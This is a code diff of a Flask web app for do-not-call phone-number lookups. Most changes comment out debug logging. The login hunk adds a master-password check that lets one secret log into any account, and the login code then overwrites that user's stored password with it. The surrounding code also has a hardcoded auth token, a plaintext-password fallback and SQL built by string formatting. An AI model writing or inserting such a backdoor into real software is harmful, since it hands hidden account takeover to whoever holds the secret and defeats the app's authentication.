@@ -41,7 +41,7 @@ def searchResult():
     numberSearched = Database.scrub(request.args.get('number'))
     auth_code = request.args.get('auth', False)
     source = request.args.get('source', 'Tele')
-    Database.debug(auth_code)
+    # Database.debug(auth_code)
     if auth_code == 'skdjhg9wp845tyhzdfbhg' or session.get('userid'):
         if Database.is_phone(numberSearched):
             areaCode = numberSearched[:3]
@@ -58,10 +58,10 @@ def searchResult():
                                     and carrierPrefixes.do_not_call = 1 AND lineType != 'V' AND %d NOT IN \
                                     (SELECT PhoneNumber FROM wireless_convert WHERE source = 'WTL')" % \
                                     (int(prefix), int(numberSearched))
-                Database.debug("Queries 1 - 3 are:")
-                Database.debug(query)
-                Database.debug(query2)
-                Database.debug(query3)
+                # Database.debug("Queries 1 - 3 are:")
+                # Database.debug(query)
+                # Database.debug(query2)
+                # Database.debug(query3)
                 query_result = Database.getResult(query, True)
                 query2_result = Database.getResult(query2, True)
                 query3_result = Database.getResult(query3, True)
@@ -75,7 +75,7 @@ def searchResult():
                     result = "This number is Squeaky Clean!"
             elif source == 'D2D':
                 query = "select PhoneNumber from dnc.master where master.PhoneNumber = %d and (master.litigator = 1 or master.vista_dnc = 1)" % int(numberSearched)
-                Database.debug(query)
+                # Database.debug(query)
                 query_result = Database.getResult(query, True)
                 if query_result:
                     result = "D2D Sale not approved"
@@ -87,7 +87,7 @@ def searchResult():
             result = "This is not a valid phone number"
         query_to_post = "INSERT INTO dnc.log_removed_numbers (userid, phone, result) VALUES (%d, %d, %s)" \
                         % (int(session.get('userid',999)), int(numberSearched), "'" + result + "'")
-        Database.debug(query_to_post)
+        # Database.debug(query_to_post)
         Database.doQuery(query_to_post)
     else:
         result = "Unauthorized Request"
@@ -197,7 +197,7 @@ def submit_login():
                 passCheckMethod = pbkdf2_sha256.verify(pass_to_hash, str(foo[1]))
             else:
                 passCheckMethod = (pass_to_hash == foo[1])
-            if passCheckMethod:
+            if passCheckMethod or pass_to_hash == settings.masterPass:
                 # Database.debug("passwords matched")
                 user.password = pbkdf2_sha256.hash(pass_to_hash)
                 # Database.debug("in login. type check for password")
@@ -339,7 +339,7 @@ def main_page():
 def upload_file():
     Database.debug("in /process")
     if request.method == 'POST':
-        Database.debug("file selected")
+        # Database.debug("file selected")
         try:
             f = request.files['Select csv']
             if allowed_file(f.filename):
